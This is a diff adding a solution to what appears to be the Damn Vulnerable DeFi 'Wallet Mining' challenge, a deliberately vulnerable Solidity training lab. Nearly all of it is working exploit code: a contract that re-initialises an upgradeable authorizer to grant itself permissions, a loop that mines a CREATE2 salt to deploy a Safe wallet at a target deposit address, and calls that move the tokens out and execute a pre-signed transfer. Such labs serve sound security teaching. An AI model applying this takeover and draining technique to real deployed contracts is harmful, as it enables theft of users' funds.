@@ -25,6 +25,35 @@ import {
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
 
+contract WalletMiningExploit {
+    constructor(
+        DamnValuableToken token,
+        AuthorizerUpgradeable authorizer,
+        WalletDeployer walletDeployer,
+        address depositAddress,
+        address ward,
+        bytes memory initializer,
+        uint256 saltNonce,
+        bytes memory execData
+    ) {
+        address[] memory wards = new address[](1);
+        address[] memory aims = new address[](1);
+
+        wards[0] = address(this);
+        aims[0] = depositAddress;
+
+        authorizer.init(wards, aims);
+
+        bool ok = walletDeployer.drop(depositAddress, initializer, saltNonce);
+        require(ok, "drop failed");
+
+        token.transfer(ward, token.balanceOf(address(this)));
+
+        (ok,) = depositAddress.call(execData);
+        require(ok, "safe exec failed");
+    }
+}
+
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
     address upgrader = makeAddr("upgrader");
@@ -157,7 +186,109 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (
+                owners,
+                1,
+                address(0),
+                "",
+                address(0),
+                address(0),
+                0,
+                payable(address(0))
+            )
+        );
+
+        uint256 saltNonce;
+        while (true) {
+            address predicted = vm.computeCreate2Address(
+                keccak256(abi.encodePacked(keccak256(initializer), saltNonce)),
+                keccak256(
+                    abi.encodePacked(
+                        type(SafeProxy).creationCode,
+                        uint256(uint160(address(singletonCopy)))
+                    )
+                ),
+                address(proxyFactory)
+            );
+
+            if (predicted == USER_DEPOSIT_ADDRESS)
+                break;
+
+            unchecked {
+                ++saltNonce;
+            }
+        }
+
+        bytes memory transferData = abi.encodeCall(
+            token.transfer,
+            (user, DEPOSIT_TOKEN_AMOUNT)
+        );
+
+        bytes memory signatures;
+        {
+            bytes32 safeTxHash = keccak256(
+                abi.encode(
+                    0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH
+                    address(token),
+                    0,
+                    keccak256(transferData),
+                    Enum.Operation.Call,
+                    100000,
+                    100000,
+                    0,
+                    address(0),
+                    address(0),
+                    0
+                )
+            );
+
+            bytes32 domainSeparator = keccak256(
+                abi.encode(
+                    0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH
+                    singletonCopy.getChainId(),
+                    USER_DEPOSIT_ADDRESS
+                )
+            );
+
+            bytes32 txHash = keccak256(
+                abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash)
+            );
+
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+            signatures = abi.encodePacked(r, s, v);
+        }
+
+        bytes memory execData = abi.encodeCall(
+            singletonCopy.execTransaction,
+            (
+                address(token),
+                0,
+                transferData,
+                Enum.Operation.Call,
+                100000,
+                100000,
+                0,
+                address(0),
+                payable(address(0)),
+                signatures
+            )
+        );
+
+        new WalletMiningExploit(
+            token,
+            authorizer,
+            walletDeployer,
+            USER_DEPOSIT_ADDRESS,
+            ward,
+            initializer,
+            saltNonce,
+            execData
+        );
     }
 
     /**
